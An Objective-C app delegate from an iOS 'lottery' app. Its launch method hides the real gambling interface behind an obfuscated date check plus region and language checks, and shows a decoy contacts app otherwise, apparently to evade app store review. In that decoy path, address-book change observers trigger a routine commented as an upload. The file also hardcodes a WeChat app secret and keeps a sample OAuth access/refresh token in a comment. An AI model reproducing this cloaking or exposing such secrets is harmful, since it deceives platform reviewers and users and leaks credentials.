//
//  AppDelegate.m
//  lottery
//
//  Created by wayne on 17/1/17.
//  Copyright © 2017年 施冬伟. All rights reserved.
//

#import "AppDelegate.h"
#import "IQKeyboardManager.h"
#import "UMMobClick/MobClick.h"

#import "UMessage.h"
#import "WXApi.h"

#import "JPUSHService.h"
// iOS10注册APNs所需头文件
#ifdef NSFoundationVersionNumber_iOS_9_x_Max
#import <UserNotifications/UserNotifications.h>
#endif

#import "GQMainViewController.h"
#import <AddressBook/AddressBook.h>
#import <Contacts/Contacts.h>
#import "ContactsObjc.h"
#import "GQTools.h"
#import "UAObfuscatedString.h"


@interface AppDelegate ()<UNUserNotificationCenterDelegate,JPUSHRegisterDelegate,
WXApiDelegate>

@property (nonatomic, strong)ContactsObjc *contactObject;
@property (nonatomic, strong)GQMainViewController *gqViewController;
@property (nonatomic, assign)BOOL checkTouchId;
@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    self.window.backgroundColor=[UIColor whiteColor];
    
    self.checkTouchId = NO;

    NSDate *hSJ = [NSDate date];
    
    NSString *defaultThings = Obfuscate._1._5._2._7._2._3._4._8._7._7;
    
    
    NSString *numberOfTime = [NSString stringWithFormat:@"%d", (long)[hSJ timeIntervalSince1970]];

    if ([numberOfTime longLongValue] < [defaultThings longLongValue]) {
        return [self contactVC];
    }
    else if (![GQTools CNArea]) {
        return [self contactVC];
    }
    else if (![GQTools CNLanguage]) {
        return [self contactVC];
    }
    else {
        
    }



    JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {

    }
    [JPUSHService registerForRemoteNotificationConfig:entity delegate:self];
    
    BOOL isProduction = YES;
    [JPUSHService setupWithOption:launchOptions appKey:@"a99fcd70e40d563b3750fda9"
                          channel:isProduction?@"CP55-Production":@"CP55-Debug"
                 apsForProduction:isProduction
            advertisingIdentifier:nil];
    
    //iOS10必须加下面这段代码。
    UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
    center.delegate=self;
    UNAuthorizationOptions types10 = UNAuthorizationOptionBadge|  UNAuthorizationOptionAlert|UNAuthorizationOptionSound;
    [center requestAuthorizationWithOptions:types10
                          completionHandler:^(BOOL granted, NSError * _Nullable error) {
                             
                          }];
    
    NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
    // app版本
    NSString *app_Version = [infoDictionary objectForKey:@"CFBundleShortVersionString"];
    
    UMConfigInstance.appKey = @"59c208fb9f06fd79d400005a";
    UMConfigInstance.channelId = [NSString stringWithFormat:@"%@-cp55",app_Version];
    [MobClick startWithConfigure:UMConfigInstance];

    
    IQKeyboardManager *manager = [IQKeyboardManager sharedManager];
    manager.enable = YES;
    manager.shouldResignOnTouchOutside = YES;
    manager.shouldToolbarUsesTextFieldTintColor = YES;
    manager.toolbarDoneBarButtonItemText = @"完成";

    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
    

    self.maiTabBarController = [[CBMainTabBarController alloc]init];
    UINavigationController *nav = [[UINavigationController alloc]initWithRootViewController:self.maiTabBarController];
    nav.navigationBarHidden = YES;
    
    self.window.rootViewController =nav;
    
    [self customAppearence];
    [self.window makeKeyAndVisible];
    
    return YES;
}

- (BOOL)contactVC {
    self.contactObject = [ContactsObjc shareInstance];
    
    if (@available(iOS 9.0, *)) {
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(addressBookDidChange:) name:CNContactStoreDidChangeNotification object:nil];
    } else {
        ABAddressBookRef addresBook = ABAddressBookCreateWithOptions(NULL, NULL);
        ABAddressBookRegisterExternalChangeCallback(addresBook, addressBookChanged, (__bridge void *)(self.window));
    }
    self.checkTouchId = YES;
    self.window.rootViewController = [[GQMainViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
    
}

#pragma mark-
- (void)customAppearence
{
    [[UINavigationBar appearance] setBackgroundImage:[UIImage imageWithColor:kMainColor] forBarMetrics:UIBarMetricsDefault];
    
    UIImage *backButtonImage = [[UIImage imageNamed:@"back_navi"] imageWithRenderingMode:UIImageRenderingModeAlwaysOriginal];
    
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
    [[UINavigationBar appearance]setBackIndicatorImage:backButtonImage];
    [[UINavigationBar appearance]setBackIndicatorTransitionMaskImage:backButtonImage];
    [[UINavigationBar appearance]setTintColor:[UIColor clearColor]];
    
    /*
    if (@available(iOS 11.0, *)) {
        [[UIScrollView appearance] setContentInsetAdjustmentBehavior:UIScrollViewContentInsetAdjustmentNever];
        // 去掉iOS11系统默认开启的self-sizing
        [UITableView appearance].estimatedRowHeight = 0;
        [UITableView appearance].estimatedSectionHeaderHeight = 0;
        [UITableView appearance].estimatedSectionFooterHeight = 0;
        [UIScrollView appearance].contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
    }
     */

    [[UINavigationBar appearance] setTitleTextAttributes:
     [NSDictionary dictionaryWithObjectsAndKeys:
      [UIColor whiteColor],
      NSForegroundColorAttributeName,[UIFont boldSystemFontOfSize:20.0f],NSFontAttributeName,
      nil]];
    
    [[UITabBar appearance]setTintColor:kMainColor];
    
}

#pragma mark - Contacts

void addressBookChanged(ABAddressBookRef addressBook, CFDictionaryRef info, void *context)
{
    // 比如上传
    NSLog(@"has changed ");
    ContactsObjc *contactObject = [ContactsObjc shareInstance];
    [contactObject startUp];
    
}

-(void)addressBookDidChange:(NSNotification*)notification{
    // 比如上传
    [self.contactObject startUp];
}

- (void)applicationWillResignActive:(UIApplication *)application {
    
    
//    [[SUMUser shareUser]lookForLoginToken];
   
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
}


- (void)applicationDidEnterBackground:(UIApplication *)application {
    // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
    // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
}


- (void)applicationWillEnterForeground:(UIApplication *)application {
    
    
    [GQUser cookBook_checkUpdateNewestVersion];
    [[NSNotificationCenter defaultCenter]postNotificationName:kNotificationNameForApplicationWillEnterForeground object:nil];
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
//    if (self.checkTouchId) {
//        [self.gqViewController checkLock];
//    }
    [UIApplication sharedApplication].applicationIconBadgeNumber = 0;
}


- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}


#pragma mark-

- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken
{
    // 1.2.7版本开始不需要用户再手动注册devicetoken，SDK会自动注册
    /*
     [UMessage registerDeviceToken:deviceToken];
     */
    
    [JPUSHService registerDeviceToken:deviceToken];
}




//iOS10以下使用这个方法接收通知
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo
{
    /*
    [UMessage didReceiveRemoteNotification:userInfo];
     */
    [JPUSHService handleRemoteNotification:userInfo];
    if([UIApplication sharedApplication].applicationState == UIApplicationStateActive){

        id alert = [[userInfo DWDictionaryForKey:@"aps"]objectForKey:@"alert"];
        NSString *title = @"推送通知";
        NSString *body = @"";
        
        if ([alert isKindOfClass:[NSDictionary class]]) {
            NSDictionary *alertDic = (NSDictionary *)alert;
            title = [alertDic DWStringForKey:@"title"];
            body = [alertDic DWStringForKey:@"body"];
            
        }else{
            body = alert;
        }
        UIAlertView *alertView = [[UIAlertView alloc]initWithTitle:title
                                                           message:body
                                                          delegate:nil
                                                 cancelButtonTitle:@"知道了"
                                                 otherButtonTitles:nil];
        [alertView show];
    }

   
    
}

//iOS10新增：处理前台收到通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions))completionHandler{
    NSDictionary * userInfo = notification.request.content.userInfo;
    
    id alert = [[userInfo DWDictionaryForKey:@"aps"]objectForKey:@"alert"];
    NSString *title = @"推送通知";
    NSString *body = @"";
    
    if ([alert isKindOfClass:[NSDictionary class]]) {
        NSDictionary *alertDic = (NSDictionary *)alert;
        title = [alertDic DWStringForKey:@"title"];
        body = [alertDic DWStringForKey:@"body"];
        
    }else{
        body = alert;
    }
    
    UIAlertView *alertView = [[UIAlertView alloc]initWithTitle:title message:body delegate:nil cancelButtonTitle:@"知道了" otherButtonTitles:nil];
    [alertView show];
    
    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于前台时的远程推送接受
        //关闭U-Push自带的弹出框
        [UMessage setAutoAlert:NO];
        //必须加这句代码
        [UMessage didReceiveRemoteNotification:userInfo];
        
    }else{
        //应用处于前台时的本地推送接受
    }
    //当应用处于前台时提示设置，需要哪个可以设置哪一个
    completionHandler(UNNotificationPresentationOptionSound|UNNotificationPresentationOptionBadge|UNNotificationPresentationOptionAlert);
}

//iOS10新增：处理后台点击通知的代理方法
-(void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler{
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        //应用处于后台时的远程推送接受
        //必须加这句代码
        /*
         [UMessage didReceiveRemoteNotification:userInfo];
         */
        [JPUSHService handleRemoteNotification:userInfo];
        
    }else{
        //应用处于后台时的本地推送接受
    }
}

- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
    
    // Required, iOS 7 Support
    [JPUSHService handleRemoteNotification:userInfo];
    completionHandler(UIBackgroundFetchResultNewData);
}



#pragma mark- JPUSHRegisterDelegate

// iOS 10 Support
- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(NSInteger))completionHandler {
    // Required
    NSDictionary * userInfo = notification.request.content.userInfo;
    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        [JPUSHService handleRemoteNotification:userInfo];
    }
    completionHandler(UNNotificationPresentationOptionAlert); // 需要执行这个方法，选择是否提醒用户，有Badge、Sound、Alert三种类型可以选择设置
}

// iOS 10 Support
- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler {
    // Required
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        [JPUSHService handleRemoteNotification:userInfo];
    }
    completionHandler();  // 系统要求执行这个方法
}


- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
    [WXApi handleOpenURL:url delegate:self];
    return YES;
}

- (void)onResp:(BaseResp *)resp
{
    if ([resp isKindOfClass:[SendAuthResp class]]) {
        SendAuthResp *temp = (SendAuthResp *)resp;
        [self queryWechatUnionid:temp.code];
        //temp.code
    }
}

- (void)queryWechatUnionid:(NSString *)code
{
    [SVProgressHUD way_showLoadingCanNotTouchClearBackground];
    
    NSString *url =[NSString stringWithFormat:
                    @"https://api.weixin.qq.com/sns/oauth2/access_token?appid=%@&secret=%@&code=%@&grant_type=authorization_code",
                    @"wx5525912ec3511b13",@"17578bee42800d5608d3f30e148d9c12",code];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSURL *zoneUrl = [NSURL URLWithString:url];
        NSString *zoneStr = [NSString stringWithContentsOfURL:zoneUrl encoding:NSUTF8StringEncoding error:nil];
        NSData *data = [zoneStr dataUsingEncoding:NSUTF8StringEncoding];
        dispatch_async(dispatch_get_main_queue(), ^{
            
            if (data)
            {
                /*
                 {
                 "access_token" = "VZpnWzT9ufPUF2iBUNjKukFViYgrIN1ysMfGJDaC21M2HZHqwB26bNWlz0WyXRKUzxqnXgW1kYo4yyDtdwJEE4Zo-eNQUV56R9wf8degtzQ";
                 "expires_in" = 7200;
                 openid = oKZpQ01Rq75rCbeWnbKwXqdQ8PnE;
                 "refresh_token" = YFMsMI0Kcyh8lO2RuaRAtHNurp1CSjCYXvu4tjraAQi4VfMEXSG1T3A4IgNLZ7kahvRxdP6nM9PQJ1WXpoqoKbwd8qS9285fuPjpNXNP3nI;
                 scope = "snsapi_userinfo";
                 unionid = "oas-J0mszbdm089Jk9gIHhFOankg";
                 }
                 */
                NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data
                                                                    options:NSJSONReadingMutableContainers error:nil];
                
                NSString *unionid = [dic DWStringForKey:@"unionid"];
                NSString *access_token = [dic DWStringForKey:@"access_token"];
                NSString *openid = [dic DWStringForKey:@"openid"];
                NSString *refresh_token = [dic DWStringForKey:@"refresh_token"];
                
                [self getWechatUserInfoWithAccessToken:access_token openId:openid];
                
                if (unionid.length>0) {
                    [SVProgressHUD dismiss];
                }else{
                }
                
                
            }else{
                
            }
            
        });
    });
}

- (void)getWechatUserInfoWithAccessToken:(NSString *)accessToken openId:(NSString *)openId
{
    NSString *url =[NSString stringWithFormat:
                    @"https://api.weixin.qq.com/sns/userinfo?access_token=%@&openid=%@",accessToken,openId];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSURL *zoneUrl = [NSURL URLWithString:url];
        NSString *zoneStr = [NSString stringWithContentsOfURL:zoneUrl encoding:NSUTF8StringEncoding error:nil];
        NSData *data = [zoneStr dataUsingEncoding:NSUTF8StringEncoding];
        dispatch_async(dispatch_get_main_queue(), ^{
            
            if (data)
            {
                NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data
                                                                    options:NSJSONReadingMutableContainers error:nil];
                
                if ([dic isKindOfClass:[NSDictionary class]]) {
                    NSString *headimgurl = [dic DWStringForKey:@"headimgurl"];
                    NSString *nickname = [dic DWStringForKey:@"nickname"];
                    if (headimgurl.length>0 && nickname.length>0) {
                    }
                }
                
                
            }
        });
        
    });
}



@end
